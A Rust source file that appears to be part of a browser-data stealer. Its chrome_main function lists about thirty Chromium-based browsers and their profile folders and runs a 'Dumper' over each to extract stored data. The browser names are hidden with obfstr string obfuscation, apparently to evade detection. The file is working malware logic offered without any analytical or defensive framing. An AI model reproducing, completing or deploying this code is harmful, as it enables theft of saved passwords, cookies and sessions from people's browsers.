

use crate::chromium::dumper::Dumper;
use std::collections::HashMap;
use crate::chromium::dumper::DumperError;
pub type DumperResult<T> = Result<T, DumperError>;




pub fn chrome_main(path: String) {

        let mut hm = HashMap::new();
        hm.insert(obfstr::obfstr!("edge").to_string(),  Dumper::new(obfstr::obfstr!("Edge"), obfstr::obfstr!("Microsoft")));
        hm.insert(obfstr::obfstr!("chromium").to_string(), Dumper::new("", "Chromium"));
        hm.insert(obfstr::obfstr!("7star").to_string(), Dumper::new("7Star", "7Star"));
        hm.insert(obfstr::obfstr!("amigo").to_string(), Dumper::new("", "Amigo"));
        hm.insert(obfstr::obfstr!("brave").to_string(), Dumper::new("Brave-Browser", "BraveSoftware"));
        hm.insert(obfstr::obfstr!("centbrowser").to_string(), Dumper::new("", "CentBrowser"));
        hm.insert(obfstr::obfstr!("chedot").to_string(), Dumper::new("", "Chedot"));
        hm.insert(obfstr::obfstr!("chrome_canary").to_string(), Dumper::new("Chrome SxS", "Google"));
        hm.insert(obfstr::obfstr!("coccoc").to_string(), Dumper::new("Browser", "CocCoc"));
        hm.insert(obfstr::obfstr!("dragon").to_string(), Dumper::new("Dragon", "Comodo"));
        hm.insert(obfstr::obfstr!("elements-browser").to_string(), Dumper::new("", "Elements Browser"));
        hm.insert(obfstr::obfstr!("epic-privacy-browser").to_string(),Dumper::new("", "Epic Privacy Browser"));
        hm.insert(obfstr::obfstr!("chrome").to_string(), Dumper::new("Chrome", "Google"));
        hm.insert(obfstr::obfstr!("kometa").to_string(), Dumper::new("", "Kometa"));
        hm.insert(obfstr::obfstr!("orbitum").to_string(), Dumper::new("", "Orbitum"));
        hm.insert(obfstr::obfstr!("sputnik").to_string(), Dumper::new("Sputnik", "Sputnik"));
        hm.insert(obfstr::obfstr!("torch").to_string(), Dumper::new("", "Torch"));
        hm.insert(obfstr::obfstr!("ucozmedia").to_string(), Dumper::new("Uran", "uCozMedia"));
        hm.insert(obfstr::obfstr!("vivaldi").to_string(), Dumper::new("", "Vivaldi"));
        hm.insert(obfstr::obfstr!("atom-mailru").to_string(), Dumper::new("Atom", "Mail.Ru"));
        hm.insert(obfstr::obfstr!("opera").to_string(), Dumper::new("Opera Software", "Opera Stable")); 
        hm.insert(obfstr::obfstr!("opera-gx").to_string(), Dumper::new("Opera Software", "Opera GX Stable"));
        hm.insert(obfstr::obfstr!("ChromePlus").to_string(), Dumper::new("MappleStudio", "ChromePlus"));
        hm.insert(obfstr::obfstr!("Iridium").to_string(), Dumper::new("Iridium", "Iridium"));
        hm.insert(obfstr::obfstr!("Iridium").to_string(), Dumper::new("", "Iridium"));
        hm.insert(obfstr::obfstr!("fenrir-inc").to_string(), Dumper::new("sleipnir5", "settings"));
        hm.insert(obfstr::obfstr!("catalinagroup").to_string(), Dumper::new("CatalinaGroup", "Citrio"));
        hm.insert(obfstr::obfstr!("Coowoo").to_string(), Dumper::new("", "Coowoo"));
        hm.insert(obfstr::obfstr!("liebao").to_string(), Dumper::new("", "liebao"));
        hm.insert(obfstr::obfstr!("qip-surf").to_string(), Dumper::new("", "Qip Surf"));
        hm.insert(obfstr::obfstr!("360browser").to_string(), Dumper::new("360Browser", "Browser"));
    let browsers = &mut hm.clone();

    let opt_browsers = browsers.keys().map(|v| v.to_string()).collect::<Vec<_>>();
    

    let _ = opt_browsers
        .into_iter()
        .filter_map(|v| browsers.get(v.as_str()).cloned())
        .map(|mut v| v.dump(path.clone()).map(|_| v))
        .filter_map(|v| v.ok())
        .collect::<Vec<_>>();

    
}
